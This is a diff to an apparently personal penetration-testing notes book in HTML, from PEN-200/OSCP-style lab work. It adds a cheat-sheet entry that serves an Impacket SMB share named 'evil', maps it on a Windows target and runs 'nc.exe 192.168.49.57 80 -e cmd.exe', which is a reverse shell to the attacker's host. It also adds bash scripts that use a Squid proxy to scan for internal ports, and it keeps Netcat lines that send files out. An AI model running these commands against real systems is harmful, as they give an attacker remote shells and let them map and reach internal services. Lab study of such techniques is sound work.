@@ -561,7 +561,7 @@ wpscan --url [target-url] --api-token [YourWPScanAPIToken]
 <tr><td>php -S 0.0.0.0:PORT</td><td>PHP builtin web server bundle</td></tr>
 <tr><td>nc -q 0 -lvp 443 &lt; file</td><td>Netcat listener to transfer files</td></tr>
 <tr><td>nc -nv IP_ADDR 443 &lt; file</td><td>Netcat command to send files</td></tr>
-<tr><td>smbserver.py SHARE share_dir                                            or                                                                                             impacket-smbserver -smb2support Share /home/kali/Documents/pen200/PG/Jacko<br></td><td>Impacket’s smbserver.py script simulates a SMB server</td></tr>
+<tr><td>smbserver.py SHARE share_dir                                            or                                                                                             impacket-smbserver -smb2support Share /home/kali/Documents/pen200/PG/Jacko                         or                   smbserver.py -smb2support -username evil -password evil evil $PWD<br>                                      then                                                                       net use z: \192.168.49.57\evil /user:evil evil<br>Z:\nc.exe 192.168.49.57 80 -e cmd.exe<br></td><td>Impacket’s smbserver.py script simulates a SMB server</td></tr>
 <tr><td>service smbd start; systemctl start smbd</td><td>Linux Samba, a share has to be added to /etc/samba/smb.conf</td></tr>
 <tr><td>service pure-ftpd start; systemctl start pure-ftpd; service proftpd start; systemctl start proftpd</td><td>Services such as pure-ftpd and proftpd can be used to setup FTP servers</td></tr>
 <tr><td>atftpd –daemon –port 69 ftp_dir</td><td>The atftpd utility allows to easily setup a TFTP server</td></tr>
@@ -1762,6 +1762,64 @@ GitHub
 python vncpasswd.py -d -f ../../htb/poison/secret
 
 </code></pre>
+<h3 id="3128---squid"><a class="header" href="#3128---squid"><ins>3128 - Squid</ins></a></h3>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid">HackTricks Link</a></p>
+<pre><code>Use these two scripts to build a list of ports, then scan with the squid proxy
+</code></pre>
+<pre><code># The file where we want to store the list of ports
+# Create the file if it doesn't exist
+ports_file="ports_to_check.txt"
+#if [[ ! -f $ports_file ]] ; then touch $ports_file ; fi
+
+# The number of Nmap top ports to output
+num_ports=100
+
+# Generate the list of top ports
+# Nmap lists port ranges with a hyphen (-)
+# We use `sed` to replace the hyphens with `..`
+# `..` indicates will help with generating port ranges below
+top_ports=$(nmap -sT --top-ports $num_ports -v -oG - 2&gt;/dev/null | grep TCP | cut -d ';' -f 2 | cut -d ')' -f 1 | tr ',', "\n" | sed 's/\-/../g')
+
+# Clear out the ports file list
+echo &gt; $ports_file
+
+# For each port in the list of ports do ...
+    # If the port has a hyphen `-` ...
+        # Create a list of ports using {$port}
+        # For example {49152..49157}
+        # Then add them to our ports list file
+    # Otherwise ...
+        # Just take a single port and add to the file
+for port in $(echo $top_ports) ; 
+do 
+    if echo $port | grep '\.\.' &gt; /dev/null; then 
+        for port_in_range in {$port} ; 
+        do 
+        	echo $port_in_range &gt;&gt; $ports_file ; 
+        done ; 
+    else 
+        echo $port &gt;&gt; $ports_file ; 
+    fi
+done
+
+</code></pre>
+<pre><code># Define a base URL, which is the proxy address minus the proxy port
+base_url='http://192.168.236.189'
+# Define the proxy URL, which is the base URL plus the proxy port
+proxy_url="$base_url:3128"
+
+for port in $(cat ports_to_check.txt) ; do \
+    # Create a test URL string, which is the base URL plus the test port
+    test_url="$base_url:$port"
+    # If we don't find the string `ERROR` the port may be open
+    if ! curl -skL --proxy $proxy_url $test_url | grep ERROR &gt; /dev/null ; then \
+        echo "$test_url may be open behind the proxy" ; \
+    fi ; \
+done 
+
+</code></pre>
+<p>Or just use Spose
+<a href="https://github.com/aancw/spose">Spose</a></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="ssh-keys"><a class="header" href="#ssh-keys">SSH Keys</a></h1>
 <p>How to add your public SSH key to another host:</p>
 <p>Create SSH key (on your host):</p>
@@ -8948,7 +9006,6 @@ nt authority\system
 
 C:\Windows\system32&gt; 
 </code></pre>
-<p>Success! We now have system access on the target system.</p>
 
                     </main>
 
